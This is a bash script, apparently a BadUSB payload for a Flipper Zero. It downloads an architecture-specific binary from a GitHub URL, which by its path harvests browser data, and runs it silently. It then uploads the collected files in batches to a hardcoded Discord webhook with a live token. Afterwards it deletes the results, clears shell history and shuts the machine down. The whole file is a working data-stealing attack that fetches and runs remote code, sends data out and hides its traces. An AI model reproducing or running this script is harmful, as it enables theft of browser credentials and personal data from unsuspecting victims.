#!/bin/bash
export WEBHOOK_URL="https://discord.com/api/webhooks/1180459253924909118/JP-HpTFSYUStv8nitmhmXn_nJzOTdCY84f7YhNOhbXtkSm-5ERSGWk4Bsey8oxvrDJpx"

folder="$PWD"
folder_path="$folder/results/"
files=()
batch_size=10

architecture=$(uname -m)

case "$architecture" in
    "x86_64")
        file_url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_amd64"
        ;;
    "i386" | "i686")
        file_url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_386"
        ;;
    "arm" | "armv71")
        file_url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_arm"
        ;;
    "aarch64")
        file_url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_386"
        ;;
    *)
        echo "Unsupported : $architecture"
        exit 1
        ;;
esac

curl -sSL $file_url -o magikarp.sh > /dev/null

chmod +x magikarp.sh > /dev/null
./magikarp.sh > /dev/null
rm "magikarp.sh" > /dev/null
files=($(find "$folder_path" -type f))

send_discord_webhook() {
    local file_batch=("$@")

    curl_args=()
    for ((i=0; i<${#file_batch[@]}; i++)); do
        file="${file_batch[$i]}"
        curl_args+=("-F" "file$((i+1))=@$file")
    done

    curl "${curl_args[@]}" \
        -F 'payload_json={"username": "Murerig", "content": "Coin Coin 😈🦆"}' \
        "$WEBHOOK_URL"
}

for ((start=0; start<${#files[@]}; start+=batch_size)); do
    end=$((start + batch_size - 1))
    if ((end >= ${#files[@]})); then
        end=$(( ${#files[@]} - 1 ))
    fi

    file_batch=("${files[@]:start:batch_size}")
    send_discord_webhook "${file_batch[@]}" > /dev/null
done

rm -rf $folder_path
history -c
shutdown -h now